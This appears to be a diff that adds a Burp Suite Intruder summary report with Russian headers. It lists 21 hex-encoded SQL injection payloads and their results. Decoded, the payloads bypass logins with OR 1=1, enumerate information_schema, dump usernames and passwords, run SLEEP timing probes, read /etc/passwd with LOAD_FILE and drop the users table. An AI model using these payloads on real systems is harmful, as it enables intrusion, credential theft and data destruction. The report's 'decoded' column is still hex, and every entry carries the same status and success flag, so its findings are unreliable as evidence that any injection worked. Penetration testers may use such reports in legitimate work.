@@ -1,0 +1,151 @@
+--- Сводный отчет по анализу Burp Suite Intruder ---
+Дата генерации: 2025-10-02 01:31:05
+Критические поля: TECHNIQUE, ORIGINAL (сырой), PAYLOAD (URL-декодированный), STATUS, INDICATORS
+======================================================================
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: Empty Payload
+  ORIGINAL: EMPTY STRING
+  PAYLOAD: EMPTY STRING
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a4f%3a52%3a20%3a31%3a3d%3a31%3a2d%3a2d
+  PAYLOAD: 27:20:4f:52:20:31:3d:31:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a4f%3a52%3a20%3a27%3a31%3a27%3a3d%3a27%3a31
+  PAYLOAD: 27:20:4f:52:20:27:31:27:3d:27:31
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a6e%3a75%3a6c%3a6c%3a2c%3a20%3a6e%3a75%3a6c%3a6c%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:6e:75:6c:6c:2c:20:6e:75:6c:6c:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a31%3a2c%3a20%3a40%3a40%3a76%3a65%3a72%3a73%3a69%3a6f%3a6e%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:31:2c:20:40:40:76:65:72:73:69:6f:6e:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a31%3a2c%3a20%3a74%3a61%3a62%3a6c%3a65%3a5f%3a6e%3a61%3a6d%3a65%3a20%3a46%3a52%3a4f%3a4d%3a20%3a69%3a6e%3a66%3a6f%3a72%3a6d%3a61%3a74%3a69%3a6f%3a6e%3a5f%3a73%3a63%3a68%3a65%3a6d%3a61%3a2e%3a74%3a61%3a62%3a6c%3a65%3a73%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:31:2c:20:74:61:62:6c:65:5f:6e:61:6d:65:20:46:52:4f:4d:20:69:6e:66:6f:72:6d:61:74:69:6f:6e:5f:73:63:68:65:6d:61:2e:74:61:62:6c:65:73:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a31%3a2c%3a20%3a63%3a6f%3a6c%3a75%3a6d%3a6e%3a5f%3a6e%3a61%3a6d%3a65%3a20%3a46%3a52%3a4f%3a4d%3a20%3a69%3a6e%3a66%3a6f%3a72%3a6d%3a61%3a74%3a69%3a6f%3a6e%3a5f%3a73%3a63%3a68%3a65%3a6d%3a61%3a2e%3a63%3a6f%3a6c%3a75%3a6d%3a6e%3a73%3a20%3a57%3a48%3a45%3a52%3a45%3a20%3a74%3a61%3a62%3a6c%3a65%3a5f%3a6e%3a61%3a6d%3a65%3a3d%3a27%3a75%3a73%3a65%3a72%3a73%3a27%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:31:2c:20:63:6f:6c:75:6d:6e:5f:6e:61:6d:65:20:46:52:4f:4d:20:69:6e:66:6f:72:6d:61:74:69:6f:6e:5f:73:63:68:65:6d:61:2e:63:6f:6c:75:6d:6e:73:20:57:48:45:52:45:20:74:61:62:6c:65:5f:6e:61:6d:65:3d:27:75:73:65:72:73:27:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a75%3a73%3a65%3a72%3a6e%3a61%3a6d%3a65%3a2c%3a20%3a70%3a61%3a73%3a73%3a77%3a6f%3a72%3a64%3a20%3a46%3a52%3a4f%3a4d%3a20%3a75%3a73%3a65%3a72%3a73%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:75:73:65:72:6e:61:6d:65:2c:20:70:61:73:73:77:6f:72:64:20:46:52:4f:4d:20:75:73:65:72:73:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a41%3a4e%3a44%3a20%3a53%3a4c%3a45%3a45%3a50%3a28%3a35%3a29%3a2d%3a2d
+  PAYLOAD: 27:20:41:4e:44:20:53:4c:45:45:50:28:35:29:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a3b%3a20%3a44%3a52%3a4f%3a50%3a20%3a54%3a41%3a42%3a4c%3a45%3a20%3a75%3a73%3a65%3a72%3a73%3a2d%3a2d
+  PAYLOAD: 27:3b:20:44:52:4f:50:20:54:41:42:4c:45:20:75:73:65:72:73:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a4f%3a52%3a20%3a31%3a3d%3a31%3a20%3a4c%3a49%3a4d%3a49%3a54%3a20%3a31%3a2d%3a2d
+  PAYLOAD: 27:20:4f:52:20:31:3d:31:20:4c:49:4d:49:54:20:31:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a4f%3a52%3a44%3a45%3a52%3a20%3a42%3a59%3a20%3a31%3a2d%3a2d
+  PAYLOAD: 27:20:4f:52:44:45:52:20:42:59:20:31:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a4f%3a52%3a44%3a45%3a52%3a20%3a42%3a59%3a20%3a33%3a2d%3a2d
+  PAYLOAD: 27:20:4f:52:44:45:52:20:42:59:20:33:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a41%3a4e%3a44%3a20%3a28%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a43%3a4f%3a55%3a4e%3a54%3a28%3a2a%3a29%3a20%3a46%3a52%3a4f%3a4d%3a20%3a75%3a73%3a65%3a72%3a73%3a29%3a20%3a3e%3a20%3a30%3a2d%3a2d
+  PAYLOAD: 27:20:41:4e:44:20:28:53:45:4c:45:43:54:20:43:4f:55:4e:54:28:2a:29:20:46:52:4f:4d:20:75:73:65:72:73:29:20:3e:20:30:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a41%3a4e%3a44%3a20%3a41%3a53%3a43%3a49%3a49%3a28%3a53%3a55%3a42%3a53%3a54%3a52%3a49%3a4e%3a47%3a28%3a28%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a70%3a61%3a73%3a73%3a77%3a6f%3a72%3a64%3a20%3a46%3a52%3a4f%3a4d%3a20%3a75%3a73%3a65%3a72%3a73%3a20%3a4c%3a49%3a4d%3a49%3a54%3a20%3a31%3a29%3a2c%3a31%3a2c%3a31%3a29%3a29%3a20%3a3e%3a20%3a36%3a35%3a2d%3a2d
+  PAYLOAD: 27:20:41:4e:44:20:41:53:43:49:49:28:53:55:42:53:54:52:49:4e:47:28:28:53:45:4c:45:43:54:20:70:61:73:73:77:6f:72:64:20:46:52:4f:4d:20:75:73:65:72:73:20:4c:49:4d:49:54:20:31:29:2c:31:2c:31:29:29:20:3e:20:36:35:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a31%3a2c%3a20%3a4c%3a4f%3a41%3a44%3a5f%3a46%3a49%3a4c%3a45%3a28%3a27%3a2f%3a65%3a74%3a63%3a2f%3a70%3a61%3a73%3a73%3a77%3a64%3a27%3a29%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:31:2c:20:4c:4f:41:44:5f:46:49:4c:45:28:27:2f:65:74:63:2f:70:61:73:73:77:64:27:29:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a31%3a2c%3a20%3a75%3a73%3a65%3a72%3a28%3a29%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:31:2c:20:75:73:65:72:28:29:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a31%3a2c%3a20%3a64%3a61%3a74%3a61%3a62%3a61%3a73%3a65%3a28%3a29%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:31:2c:20:64:61:74:61:62:61:73:65:28:29:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a41%3a4e%3a44%3a20%3a31%3a3d%3a49%3a46%3a28%3a31%3a3d%3a31%3a2c%3a20%3a53%3a4c%3a45%3a45%3a50%3a28%3a33%3a29%3a2c%3a20%3a30%3a29%3a2d%3a2d%3a2d
+  PAYLOAD: 27:20:41:4e:44:20:31:3d:49:46:28:31:3d:31:2c:20:53:4c:45:45:50:28:33:29:2c:20:30:29:2d:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a4f%3a52%3a20%3a45%3a58%3a49%3a53%3a54%3a53%3a28%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a2a%3a20%3a46%3a52%3a4f%3a4d%3a20%3a75%3a73%3a65%3a72%3a73%3a20%3a57%3a48%3a45%3a52%3a45%3a20%3a75%3a73%3a65%3a72%3a6e%3a61%3a6d%3a65%3a3d%3a27%3a61%3a64%3a6d%3a69%3a6e%3a27%3a29%3a2d%3a2d
+  PAYLOAD: 27:20:4f:52:20:45:58:49:53:54:53:28:53:45:4c:45:43:54:20:2a:20:46:52:4f:4d:20:75:73:65:72:73:20:57:48:45:52:45:20:75:73:65:72:6e:61:6d:65:3d:27:61:64:6d:69:6e:27:29:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
+FILE: HEX_20_payloads.xml
+  STATUS: 200
+  TECHNIQUE: URL + HEX Encoding
+  ORIGINAL: 27%3a20%3a55%3a4e%3a49%3a4f%3a4e%3a20%3a53%3a45%3a4c%3a45%3a43%3a54%3a20%3a67%3a72%3a6f%3a75%3a70%3a5f%3a63%3a6f%3a6e%3a63%3a61%3a74%3a28%3a74%3a61%3a62%3a6c%3a65%3a5f%3a6e%3a61%3a6d%3a65%3a29%3a2c%3a32%3a20%3a46%3a52%3a4f%3a4d%3a20%3a69%3a6e%3a66%3a6f%3a72%3a6d%3a61%3a74%3a69%3a6f%3a6e%3a5f%3a73%3a63%3a68%3a65%3a6d%3a61%3a2e%3a74%3a61%3a62%3a6c%3a65%3a73%3a20%3a57%3a48%3a45%3a52%3a45%3a20%3a74%3a61%3a62%3a6c%3a65%3a5f%3a73%3a63%3a68%3a65%3a6d%3a61%3a3d%3a64%3a61%3a74%3a61%3a62%3a61%3a73%3a65%3a28%3a29%3a2d%3a2d
+  PAYLOAD: 27:20:55:4e:49:4f:4e:20:53:45:4c:45:43:54:20:67:72:6f:75:70:5f:63:6f:6e:63:61:74:28:74:61:62:6c:65:5f:6e:61:6d:65:29:2c:32:20:46:52:4f:4d:20:69:6e:66:6f:72:6d:61:74:69:6f:6e:5f:73:63:68:65:6d:61:2e:74:61:62:6c:65:73:20:57:48:45:52:45:20:74:61:62:6c:65:5f:73:63:68:65:6d:61:3d:64:61:74:61:62:61:73:65:28:29:2d:2d
+  INDICATORS: Success/Auth Heuristic
+----------------------------------------------------------------------
